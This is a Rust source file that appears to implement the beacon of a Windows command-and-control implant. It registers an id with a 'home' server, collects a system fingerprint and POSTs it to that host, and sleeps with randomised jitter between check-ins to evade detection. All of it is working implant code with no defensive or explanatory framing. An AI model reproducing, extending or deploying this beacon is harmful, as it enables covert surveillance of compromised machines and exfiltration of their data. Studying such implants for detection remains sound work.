pub mod client;
use client::*;
use log::{debug, info};
use std::{
    net::SocketAddrV4,
    time::{Duration, SystemTime, UNIX_EPOCH},
};
use windows::core::HSTRING;

use crate::collector;

pub struct Beacon {
    id: u32,
    client: Client,
    home: SocketAddrV4,
    base_jitter: Duration,
    rate: f64,
}

impl Beacon {
    pub fn new(home: SocketAddrV4) -> windows::core::Result<Self> {
        let client = Client::new()?;
        let id = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .subsec_nanos();

        Ok(Self {
            client,
            id,
            home,
            base_jitter: Duration::from_secs(5),
            rate: 0.5,
        })
    }

    fn send<F>(&mut self, f: F) -> windows::core::Result<()>
    where
        F: FnOnce(&mut Self) -> windows::core::Result<()>,
    {
        self.sleep_with_jitter();
        f(self)
    }

    pub fn send_initial_request(&mut self) -> windows::core::Result<()> {
        self.send(|beacon| beacon.initial_request())
    }

    pub fn send_system_info(&mut self) -> windows::core::Result<()> {
        self.send(|beacon| beacon.system_info())
    }

    fn initial_request(&mut self) -> windows::core::Result<()> {
        info!(
            "sending initial request to {}:{}",
            self.home.ip(),
            self.home.port()
        );
        let id_bytes = self.id.to_le_bytes();

        let headers = [HSTRING::from("Content-Type: application/octet-stream")];

        let header_block = build_winhttp_headers(&headers);

        let hostname_win = HSTRING::from(self.home.ip().to_string());

        let req = Request {
            hostname: hostname_win,
            port: self.home.port(),
            method: HSTRING::from("POST"),
            path: HSTRING::from("/api/v1/hello"),
            headers: Some(&header_block),
            body: Some(&id_bytes),
        };

        let resp = self.client.request(req)?;

        info!("response body: {:?}", resp.body);
        info!("response headers: {:?}", resp.headers);

        Ok(())
    }

    fn system_info(&mut self) -> windows::core::Result<()> {
        info!("collecting system info...");
        let sys_info = collector::SystemFingerprint::collect()?;

        let bytes =
            postcard::to_allocvec(&sys_info).map_err(|_| windows::core::Error::from_win32())?;

        debug!("sending {} bytes of fingerprint", bytes.len());

        let headers = [HSTRING::from("Content-Type: application/octet-stream")];

        let header_block = build_winhttp_headers(&headers);

        let hostname_win = HSTRING::from(self.home.ip().to_string());

        let req = Request {
            hostname: hostname_win,
            port: self.home.port(),
            method: HSTRING::from("POST"),
            path: HSTRING::from("/api/v1/sysinfo"),
            headers: Some(&header_block),
            body: Some(&bytes),
        };

        let resp = self.client.request(req)?;

        info!("response body: {:?}", resp.body);
        info!("response headers: {:?}", resp.headers);

        Ok(())
    }

    fn sleep_with_jitter(&self) {
        let base_ms = self.base_jitter.as_millis() as i64;
        if base_ms == 0 {
            return;
        }

        let rate = self.rate.clamp(0.0, 1.0);

        let jitter_ms = (base_ms as f64 * rate) as i64;
        if jitter_ms == 0 {
            info!(
                "sleeping for approximately {} secs",
                self.base_jitter.as_secs()
            );
            std::thread::sleep(self.base_jitter);
            return;
        }

        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .subsec_nanos() as i64;

        let offset = (nanos % (2 * jitter_ms + 1)) - jitter_ms;
        let result_ms = (base_ms + offset).max(0);

        info!(
            "sleeping for approximately {} secs",
            Duration::from_millis(result_ms as u64).as_secs()
        );
        std::thread::sleep(Duration::from_millis(result_ms as u64));
    }
}

fn build_winhttp_headers(headers: &[HSTRING]) -> Vec<u16> {
    let mut buf: Vec<u16> = Vec::new();

    for header in headers {
        buf.extend(header.as_wide());
    }

    buf.push(0);
    buf
}
